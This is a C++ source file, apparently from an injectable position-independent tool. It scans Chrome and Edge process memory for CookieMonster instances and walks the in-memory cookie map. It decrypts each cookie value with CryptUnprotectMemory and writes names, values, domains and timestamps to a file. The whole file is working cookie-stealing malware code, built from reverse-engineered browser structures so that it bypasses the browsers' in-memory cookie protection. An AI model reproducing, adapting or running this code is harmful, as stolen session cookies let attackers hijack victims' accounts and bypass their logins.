#include <wtypes.h>
#include "GetProcAddress.h"
#include "win32.h"
#include "FileIO.h"
#include <cstdint>
#include "my_cstring.h"

#pragma region Structs

struct OptimizedString {
    char buf[23];
    UCHAR len;
};

struct RemoteString {
    uintptr_t dataAddress;
    size_t strLen; //This won't include the null terminator
    int strMax; //Maximum string length
    char unk[3]; //I just couldn't figure out the last data type :(
    UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
};

struct RemoteVector {
    uintptr_t begin_;
    uintptr_t end_;
    uintptr_t unk; //Seems to be same as the end_ ?
};

struct ProcessBoundString {
    RemoteVector maybe_encrypted_data_;
    size_t original_size_;
    BYTE unk[8]; //No clue
    bool encrypted_ = false;
};

#pragma region Chrome

enum class CookieSameSite {
    UNSPECIFIED = -1,
    NO_RESTRICTION = 0,
    LAX_MODE = 1,
    STRICT_MODE = 2,
    // Reserved 3 (was EXTENDED_MODE), next number is 4.

    // Keep last, used for histograms.
    kMaxValue = STRICT_MODE
};

enum class CookieSourceScheme {
    kUnset = 0,
    kNonSecure = 1,
    kSecure = 2,

    kMaxValue = kSecure  // Keep as the last value.
};

enum CookiePriority {
    COOKIE_PRIORITY_LOW = 0,
    COOKIE_PRIORITY_MEDIUM = 1,
    COOKIE_PRIORITY_HIGH = 2,
    COOKIE_PRIORITY_DEFAULT = COOKIE_PRIORITY_MEDIUM
};

enum class CookieSourceType {
    // 'unknown' is used for tests or cookies set before this field was added.
    kUnknown = 0,
    // 'http' is used for cookies set via HTTP Response Headers.
    kHTTP = 1,
    // 'script' is used for cookies set via document.cookie.
    kScript = 2,
    // 'other' is used for cookies set via browser login, iOS, WebView APIs,
    // Extension APIs, or DevTools.
    kOther = 3,

    kMaxValue = kOther,  // Keep as the last value.
};

//There is now additional cookie type "CookieBase", but I'm not going to add that here yet
struct CanonicalCookieChrome {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    ProcessBoundString value; //size 48
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};

#pragma endregion

#pragma region Edge
struct CanonicalCookieEdge {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    char partition_key[136];  //Not implemented
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    ProcessBoundString value;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};

#pragma endregion

struct Node {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];
    OptimizedString key;
    uintptr_t valueAddress;
};

struct RootNode {
    uintptr_t beginNode;
    uintptr_t firstNode;
    size_t size;
};

#pragma endregion

#pragma region Pattern

BOOL FindLargestSection(uintptr_t moduleAddr, uintptr_t& resultAddress, Pointers* ctx) {

    MEMORY_BASIC_INFORMATION memoryInfo;
    uintptr_t offset = moduleAddr;

    SIZE_T largestRegion = 0;

    DFR_CACHE(KERNEL32, VirtualQuery, ctx);
    while (VirtualQuery(reinterpret_cast<LPVOID>(offset), &memoryInfo, sizeof(memoryInfo)))
    {
        if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READONLY) != 0 && memoryInfo.Type == MEM_IMAGE)
        {
            if (memoryInfo.RegionSize > largestRegion) {
                largestRegion = memoryInfo.RegionSize;
                resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
            }
        }
        offset += memoryInfo.RegionSize;
    }
    if (largestRegion > 0)
        return TRUE;

    return FALSE;
}

void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        byteArray[i] = static_cast<BYTE>(value & 0xFF);
        value >>= 8;
    }
}

void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
    size_t szAddr = sizeof(uintptr_t) - 1;
    for (offset -= 1; szAddr > 3; offset--) {
        pattern[offset] = baseAddrPattern[szAddr];
        szAddr--;
    }
}

BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

    for (size_t i = 0; i < num; ++i) {
        if (searchPattern[i] == 0xAA)
            continue;
        if (source[i] != searchPattern[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

BOOL MemCmp(const BYTE* buffer, const BYTE* pattern, size_t szPattern) {
    for (size_t i = 0; i < szPattern; i++) {
        if (buffer[i] != pattern[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress, Pointers* ctx) {

    //Copy the pattern
    BYTE* newPattern = (BYTE*)MyHeapAlloc(sizeof(BYTE) * patternSize, ctx);
    for (size_t i = 0; i < patternSize; i++)
        newPattern[i] = pattern[i];

    BYTE baseAddrPattern[sizeof(uintptr_t)];
    ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));

    PatchPattern(newPattern, baseAddrPattern, 16);
    PatchPattern(newPattern, baseAddrPattern, 24);
    PatchPattern(newPattern, baseAddrPattern, 56);
    PatchPattern(newPattern, baseAddrPattern, 64);
    PatchPattern(newPattern, baseAddrPattern, 88);
    PatchPattern(newPattern, baseAddrPattern, 152);

    return newPattern;
}

BOOL FindPattern(const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster, Pointers* ctx) {

    DFR_CACHE(KERNEL32, GetSystemInfo, ctx);
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

    MEMORY_BASIC_INFORMATION memoryInfo = {0};

    DFR_CACHE(KERNEL32, VirtualQuery, ctx);
    DFR_CACHE(KERNEL32, ReadProcessMemory, ctx);
    DFR_CACHE(KERNEL32, GetProcessHeaps, ctx);

    const size_t szHeaps = 16;
    HANDLE heaps[szHeaps] = { 0 };
    DWORD numHeaps = GetProcessHeaps(szHeaps, heaps);

    if (numHeaps == 0) {
        PICARR(failed, "[-] GetProcessHeaps failed");
        WriteLineToFile(failed, ctx);
        return FALSE;
    }

    while (startAddress < endAddress) {
        if (VirtualQuery(reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {

                //Do not scan the process heaps
                for (DWORD i = 0; i < numHeaps; i++) {
                    if (memoryInfo.AllocationBase == heaps[i]) {
                        startAddress += memoryInfo.RegionSize;
                        continue;
                    }
                }
                
                BYTE* buffer = (BYTE*)MyHeapAlloc(sizeof(BYTE) * memoryInfo.RegionSize, ctx);
                SIZE_T bytesRead = 0;

                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress), ctx);

                //We are using ReadProcessMemory even as we are running in the target process as sometimes the memory region has already gone stale, or the readable
                //memory area is not acutally as large as RegionSize suggests... Would love to get rid of ReadProcessMemory if you just know how
                if (ReadProcessMemory((HANDLE)-1, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                    for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                        if (MyMemCmp(buffer + i, newPattern, patternSize)) {
                            uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                            uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);

                            //Make sure we didn't find ourselves
                            if (MemCmp((const BYTE*)buffer + i, pattern, patternSize))
                                continue;
                            if (MemCmp((const BYTE*)buffer + i, newPattern, patternSize))
                                continue;

                            PICARR(found1, "[*] Found pattern on: ");
                            WriteToFile(found1, ctx);

                            PICARR(found2, " AllocationBase: ");
                            WriteToFile(found2, ctx);
                            WriteHexToFile((const unsigned char*)&memoryInfo.AllocationBase, sizeof(PVOID), ctx);

                            PICARR(found3, " BaseAddress: ");
                            WriteToFile(found3, ctx);
                            WriteHexToFile((const unsigned char*)&memoryInfo.BaseAddress, sizeof(PVOID), ctx);

                            PICARR(found4, " Offset: ");
                            WriteToFile(found4, ctx);
                            WriteHexLineToFile((const unsigned char*)&offset, sizeof(uintptr_t), ctx);

                            if (szCookieMonster >= 1000) {
                                MyHeapFree(newPattern, ctx);
                                return TRUE;
                            }

                            cookieMonsterInstances[szCookieMonster] = resultAddress;
                            szCookieMonster++;
                        }
                    }
                }
                MyHeapFree(newPattern, ctx);
                MyHeapFree(buffer, ctx);
            }

            startAddress += memoryInfo.RegionSize;
        }
        else {
            PICARR(failed, "[-] VirtualQuery failed");
            WriteLineToFile(failed, ctx);
            break;
        }
    }
    if (szCookieMonster > 0)
        return TRUE;
    return FALSE;
}

#pragma endregion

#pragma region Extraction

void IntToDecStr(char* buf, int value, int minDigits) {
    for (int i = minDigits - 1; i >= 0; i--) {
        buf[i] = '0' + (value % 10);
        value /= 10;
    }
    buf[minDigits] = '\0';
}

void PrintTimeStamp(int64_t timeStamp, Pointers* ctx) {
    ULONGLONG fileTimeTicks = timeStamp * 10;

    FILETIME fileTime;
    fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
    fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

    SYSTEMTIME systemTime;
    DFR_CACHE(KERNEL32, FileTimeToSystemTime, ctx);
    FileTimeToSystemTime(&fileTime, &systemTime);

    char num[8];
    DWORD written = 0;
    BYTE dash[] = { 0x2D, 0x00 };       // "-"
    BYTE space[] = { 0x20, 0x00 };      // " "
    BYTE colon[] = { 0x3A, 0x00 };      // ":"

    // Year (4 digits)
    IntToDecStr(num, systemTime.wYear, 4);
    WriteToFile(num, ctx);
    WriteToFile((const char*)dash, ctx);

    // Month (2 digits)
    IntToDecStr(num, systemTime.wMonth, 2);
    WriteToFile(num, ctx);
    WriteToFile((const char*)dash, ctx);

    // Day (2 digits)
    IntToDecStr(num, systemTime.wDay, 2);
    WriteToFile(num, ctx);
    WriteToFile((const char*)space, ctx);

    // Hour (2 digits)
    IntToDecStr(num, systemTime.wHour, 2);
    WriteToFile(num, ctx);
    WriteToFile((const char*)colon, ctx);

    // Minute (2 digits)
    IntToDecStr(num, systemTime.wMinute, 2);
    WriteToFile(num, ctx);
    WriteToFile((const char*)colon, ctx);

    // Second (2 digits)
    IntToDecStr(num, systemTime.wSecond, 2);
    WriteLineToFile(num, ctx);
}

void ReadString(OptimizedString string, Pointers* ctx) {
    if (string.len > 23)
    {
        RemoteString longString = { 0 };
        my_memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
            const char* str = reinterpret_cast<const char*>(longString.dataAddress);
            WriteLineToFile(str, ctx);
        }
    }
    else
        WriteLineToFile((const char*)string.buf, ctx);

}

void PrintAndDecrypt(BYTE* buf, DWORD dwSize, size_t origSize, Pointers* ctx) {
    DFR_CACHE(CRYPT32, CryptUnprotectMemory, ctx)
    if (!CryptUnprotectMemory(buf, dwSize, CRYPTPROTECTMEMORY_SAME_PROCESS)) {
        PICARR(failed, "[-] Failed to decrypt cookie value");
        WriteLineToFile(failed, ctx);
    }
    else {
        char* decrypted = (char*)MyHeapAlloc(origSize + 1, ctx);
        my_memcpy(decrypted, buf, origSize);
        *(decrypted + origSize) = '\0';
        WriteLineToFile(decrypted, ctx);
        MyHeapFree(decrypted, ctx);
    }
    return;
}

void ReadVector(RemoteVector vector, size_t origSize, Pointers* ctx) {
    size_t szSize = vector.end_ - vector.begin_;
    if (szSize <= 0) {
        //Some cookies just are like that. tapad.com cookie: TapAd_3WAY_SYNCS for example is buggy even with browser tools
        PICARR(failed, "[-] Invalid value length\n");
        WriteLineToFile(failed, ctx);
        return;
    }

    BYTE* buf = (BYTE*)MyHeapAlloc(szSize + 1, ctx);
    if (buf == 0 || vector.begin_ == NULL) {
        PICARR(failed, "[-] Failed to read encrypted cookie value");
        WriteLineToFile(failed, ctx);
        MyHeapFree(buf, ctx);
        return;
    }

    my_memcpy(buf, reinterpret_cast<void*>(vector.begin_), szSize);

    PrintAndDecrypt(buf, szSize, origSize, ctx);

    MyHeapFree(buf, ctx);
}

void PrintValuesChrome(CanonicalCookieChrome* cookie, Pointers* ctx) {
    PICARR(truetxt, "True");
    PICARR(falsetxt, "False");

    PICARR(name, "    Name: ");
    WriteToFile(name, ctx);
    ReadString(cookie->name, ctx);
    PICARR(value, "    Value: ");
    WriteToFile(value, ctx);
    ReadVector(cookie->value.maybe_encrypted_data_, cookie->value.original_size_, ctx);
    PICARR(domain, "    Domain: ");
    WriteToFile(domain, ctx);
    ReadString(cookie->domain, ctx);
    PICARR(path, "    Path: ");
    WriteToFile(path, ctx);
    ReadString(cookie->path, ctx);
    PICARR(create, "    Creation time: ");
    WriteToFile(create, ctx);
    PrintTimeStamp(cookie->creation_date, ctx);
    PICARR(expire, "    Expiration time: ");
    WriteToFile(expire, ctx);
    PrintTimeStamp(cookie->expiry_date, ctx);
    PICARR(accessed, "    Last accessed: ");
    WriteToFile(accessed, ctx);
    PrintTimeStamp(cookie->last_access_date, ctx);
    PICARR(updated, "    Last updated: ");
    WriteToFile(updated, ctx);
    PrintTimeStamp(cookie->last_update_date, ctx);
    PICARR(secure, "    Secure: ");
    WriteToFile(secure, ctx);
    WriteLineToFile(cookie->secure ? truetxt : falsetxt, ctx);
    PICARR(httponly, "    HttpOnly: ");
    WriteToFile(httponly, ctx);
    WriteLineToFile(cookie->httponly ? truetxt : falsetxt, ctx);

    PICARR(nl, "\n");
    WriteToFile(nl, ctx);
}

void PrintValuesEdge(CanonicalCookieEdge* cookie, Pointers* ctx) {
    PICARR(truetxt, "True");
    PICARR(falsetxt, "False");

    PICARR(name, "    Name: ");
    WriteToFile(name, ctx);
    ReadString(cookie->name, ctx);
    PICARR(value, "    Value: ");
    WriteToFile(value, ctx);
    ReadVector(cookie->value.maybe_encrypted_data_, cookie->value.original_size_, ctx);
    PICARR(domain, "    Domain: ");
    WriteToFile(domain, ctx);
    ReadString(cookie->domain, ctx);
    PICARR(path, "    Path: ");
    WriteToFile(path, ctx);
    ReadString(cookie->path, ctx);
    PICARR(create, "    Creation time: ");
    WriteToFile(create, ctx);
    PrintTimeStamp(cookie->creation_date, ctx);
    PICARR(expire, "    Expiration time: ");
    WriteToFile(expire, ctx);
    PrintTimeStamp(cookie->expiry_date, ctx);
    PICARR(accessed, "    Last accessed: ");
    WriteToFile(accessed, ctx);
    PrintTimeStamp(cookie->last_access_date, ctx);
    PICARR(updated, "    Last updated: ");
    WriteToFile(updated, ctx);
    PrintTimeStamp(cookie->last_update_date, ctx);
    PICARR(secure, "    Secure: ");
    WriteToFile(secure, ctx);
    WriteLineToFile(cookie->secure ? truetxt : falsetxt, ctx);
    PICARR(httponly, "    HttpOnly: ");
    WriteToFile(httponly, ctx);
    WriteLineToFile(cookie->httponly ? truetxt : falsetxt, ctx);

    PICARR(nl, "\n");
    WriteToFile(nl, ctx);
}

void ProcessNodeValue(uintptr_t Valueaddr, Pointers* ctx) {

    if (ctx->targetConfig == Config::Chrome) {
        CanonicalCookieChrome* cookie = reinterpret_cast<CanonicalCookieChrome*>(Valueaddr);
        PrintValuesChrome(cookie, ctx);
    }
    else {
        CanonicalCookieEdge* cookie = reinterpret_cast<CanonicalCookieEdge*>(Valueaddr);
        PrintValuesEdge(cookie, ctx);
    }
}

void ProcessNode(const Node& node, Pointers* ctx) {
    // Process the current node
    PICARR(keyText, "Cookie Key: ");
    WriteToFile(keyText, ctx);
    ReadString(node.key, ctx);

    ProcessNodeValue(node.valueAddress, ctx);

    // Process the left child if it exists
    if (node.left != 0)
        ProcessNode(*reinterpret_cast<Node*>(node.left), ctx);

    // Process the right child if it exists
    if (node.right != 0)
        ProcessNode(*reinterpret_cast<Node*>(node.right), ctx);
}

void WalkCookieMap(uintptr_t cookieMapAddress, Pointers* ctx) {

    RootNode* cookieMap = reinterpret_cast<RootNode*>(cookieMapAddress);

    if (cookieMap->firstNode == 0 || cookieMap->size == 0) //CookieMap was empty
    {
        PICARR(failed, "[*] This Cookie map was empty\n");
        WriteLineToFile(failed, ctx);
        return;
    }

    PICARR(numText, "[*] Number of available cookies: ");
    WriteToFile(numText, ctx);
    WriteHexLineToFile((unsigned char*)&cookieMap->size, sizeof(size_t), ctx);

    PICARR(extractedText, "[+] Extracted Cookies: \n");
    WriteLineToFile(extractedText, ctx);
    // Process the first node in the binary search tree
    ProcessNode(*reinterpret_cast<Node*>(cookieMap->firstNode), ctx);

    return;
}

#pragma endregion